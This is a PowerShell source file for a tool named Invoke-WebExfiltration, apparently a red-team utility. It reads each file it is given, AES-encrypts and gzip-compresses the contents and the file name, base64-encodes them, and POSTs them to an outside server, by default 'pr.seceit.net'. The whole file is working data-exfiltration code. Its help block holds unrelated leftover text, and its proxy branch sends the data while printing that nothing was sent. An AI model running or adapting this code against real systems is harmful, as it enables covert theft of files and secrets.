
Function Invoke-WebExfiltration {
     <#
        .SYNOPSIS
        PowerShell function to exfiltrate data via HTTP(s) POST request (with file gzip compression)
        Author: Philipp Rieth

        .DESCRIPTION
        ...




        .PARAMETER Name
        Specifies the file name.

        .PARAMETER Extension
        Specifies the extension. "Txt" is the default.

        .INPUTS
        None. You cannot pipe objects to Add-Extension.

        .OUTPUTS
        System.String. Add-Extension returns a string with the extension or file name.

        .EXAMPLE
        PS> extension -name "File"
        File.txt

        .EXAMPLE
        PS> extension -name "File" -extension "doc"
        File.doc

        .EXAMPLE
        PS> extension "File" "doc"
        File.doc

        .LINK
        GitHub: https://github.com/PhilippRieth/Invoke-WebExfiltration

    #>

    [cmdletbinding()]
    Param(
        [Parameter(
                Position = 0,
                Mandatory = $true,
                # ValueFromPipelineByPropertyName=$true,
                ValueFromPipeline = $true
        )]$File,
        [Parameter(
                Position = 1,
                Mandatory = $false
        #ValueFromPipelineByPropertyName=$true
        )]
        [string[]]$Target = 'https://pr.seceit.net',
        [string]$Password,
        [string]$Proxy
    )

    Begin {
        Write-Host "[~] Target server: '$target'"
        if ($Proxy){
            Write-Host "[!] Using HTTP proxy: '$Proxy'"
        }
        if ((-Not $Password) -And (-Not $unencrypted)) {
            # $Password = Read-Host -AsSecureString "Password"
            $Password = Read-Host -MaskInput "[*] Password"

            if (-Not $Password){
                Write-Host "[!] You provided an empty password! Files and file names will not be encrypted."
                $yes_no = Read-Host "[!] Do you wish to continue? (y/N)"

                if ($yes_no -like "y*"){
                    $unencrypted = $true
                    Write-Host "[!] Files and file names will not be encrypted"
                } else {
                    Write-Host "[X] Exit"
                    Break
                }
            }

        }elseif ($Password -and $unencrypted){
            Write-Host "[X] You can't specifiy '-Password' and '-Unencrypted' at the same time"
            break
        }

        Write-Debug "Plaintext password: '$Password'"
        # Write-Host "[~]"
    }

    Process {
         if ((Get-Item $file) -is [System.IO.DirectoryInfo]){
             Write-Verbose "'$file' is a directory. Skipping..."
             return
         }

        Write-Host "[+] Exfiltrating file '$file'"

        # read file bytes and get file names
        $file_name = [System.IO.Path]::GetFileName($file)
        $file_bin = [IO.File]::ReadAllBytes($file)

        Write-Verbose "AES-256 encrypting '$file_name' (Block: 128 Bit)"

         # AES encrypt
         # Source: https://www.powershellgallery.com/packages/DRTools/4.0.3.4/Content/Functions%5CInvoke-AESEncryption.ps1
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256

        $password_sha256 = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Password))
        $aesManaged.Key = $password_sha256

        $encryptor = $aesManaged.CreateEncryptor()
        $file_bin_encrypted = $encryptor.TransformFinalBlock($file_bin, 0, $file_bin.Length)
        $file_bin_encrypted = $aesManaged.IV + $file_bin_encrypted

        # Write-Debug "Key SHA256 Dec: $($aesManaged.Key)"
        Write-Debug "Key SHA256 Hex: $([System.BitConverter]::ToString($aesManaged.Key).Replace('-', ''))"
        Write-Debug "Key length:     $($aesManaged.KeySize) Bit ($($aesManaged.KeySize/8) Byte)"
        # Write-Debug "AES IV Dec:     $($aesManaged.IV)"
        Write-Debug "AES IV Hex:     $([System.BitConverter]::ToString($aesManaged.IV).Replace('-', ''))"
        Write-Debug "AES IV length:  $([System.BitConverter]::ToString($aesManaged.IV).Replace('-', '').length*4) Bit ($([System.BitConverter]::ToString($aesManaged.IV).Replace('-', '').length*4/8) Byte)"
        Write-Debug "AES-256 Bin: $([System.BitConverter]::ToString($file_bin_encrypted).Replace('-', ''))"

        $file_name_utf8 = [System.Text.Encoding]::UTF8.GetBytes($file)
        $file_name_encrypted = $encryptor.TransformFinalBlock($file_name_utf8, 0, $file_name_utf8.Length)
        $file_name_encrypted = $aesManaged.IV + $file_name_encrypted
        Write-Debug "AES-256 file name: $([System.BitConverter]::ToString($file_name_encrypted).Replace('-', ''))"

        $aesManaged.Dispose()
        Write-Verbose "AES-256 encrypted '$file_name'"

        # Gzip compress content
        # Undo: cat LICENSE.gzip.b64 | base64 -d | gzip -d
        Write-Verbose "Gzip compressing file '$file_name'"
        # Compress Data via gzip stream
        $ms = New-Object IO.MemoryStream
        $cs = New-Object System.IO.Compression.GZipStream ($ms, [Io.Compression.CompressionMode]"Compress")
        $cs.Write($file_bin_encrypted, 0, $file_bin_encrypted.Length)
        $cs.Close()
        Write-Verbose "Compressed '$file_name'"

        # convert to base64 string
        $b64_bin_gzip = [Convert]::ToBase64String($ms.ToArray())
        $b64_filename = [Convert]::ToBase64String($file_name_encrypted)

        Write-Debug "Base64 file name: $b64_filename"
        Write-Debug "Base64 bin: $b64_bin_gzip"
        $ms.Close()

        # Write encrypted base64 file to disk
        # $b64_bin_gzip | Out-File "$file.aes256.gzip.b64"

        # ToDo: Add secrent as an HTTP header, like an API key so unrestricted people can't upload?

        $body = @{
            "fn" = "$b64_filename"
            "ct" = "$b64_bin_gzip"
        }

        Write-Verbose "Uploading file '$file_name'"
        $uri = [uri]::EscapeUriString($target)
        $rest_timeout = 5

        # ToDo: implement prameter '-insecure' if certificate is not trusted (e.g. self signed)

        try {
            if ($Proxy){
                $uriProxy = [uri]::EscapeUriString($Proxy)

                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
                Invoke-WebRequest -Uri $uri -Method POST -Body ($body|ConvertTo-Json) -ContentType "application/json" -Proxy $uriProxy
                Write-Host "[X] Error: Proxy not supported yet. I'm not sending anything!"

            } else {
                $response = Invoke-WebRequest -Uri $uri -Method POST -Body ($body|ConvertTo-Json) -ContentType "application/json" -TimeoutSec $rest_timeout
            }
        }catch [System.Net.WebException] {
            if($_.Exception.Status -eq 'Timeout'){
                Write-Host "[X] Error: Send data to server but got timeout after $rest_timeout sec. "
                break
            }else {
                Write-Host "[X] Error: An unexcepted System.Net.WebExpection occured. $($_.Exception.GetType().FullName)"
            }
        }
        catch  [System.Net.Http.HttpRequestException] {
            Write-Host "[X] Error: I think I could not connect to the server. Got this error: '$($_.Exception.Message)'"
            break
        }
        catch {
            Write-Host "[X] Error: An unknown error occured! $($_.Exception.GetType().FullName)"
            Write-Host "[X] Error: StatusCode:  $($_.Exception.Response.StatusCode.value__)"
            Write-Host "[X] Error: StatusDescription:  $($_.Exception.Response.StatusDescription)"
            Write-Host "[X] Error: I've no idea what's going on :("
            break
        }

        if ($response.StatusCode -ne '200'){
            Write-Host "[!] Error: Sending successfull but got resonse code '$($response.StatusCode)' from server. The file was probably not exfiltrated!"
            Write-Host "[!] Error: Message from server: '$($response.Content)'"
        }

        Write-Verbose "Uploaded '$file_name'"
    }

     End {
         # Write-Host "[~]"
         Write-Host "[~] All done!"
     }
}